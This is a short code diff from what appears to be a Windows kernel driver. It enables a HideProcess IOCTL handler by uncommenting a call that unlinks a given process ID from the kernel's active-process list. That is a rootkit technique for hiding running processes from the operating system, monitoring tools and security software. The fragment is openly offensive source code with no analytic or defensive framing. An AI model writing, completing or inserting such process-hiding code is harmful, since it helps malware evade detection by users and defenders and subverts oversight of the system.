@@ -46,7 +46,7 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 		return STATUS_INVALID_PARAMETER;
 	}
 
-	//status = ProcHandler::UnlinkActiveProcessLinks(*pid);
+	status = ProcHandler::UnlinkActiveProcessLinks(*pid);
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
 	return status;
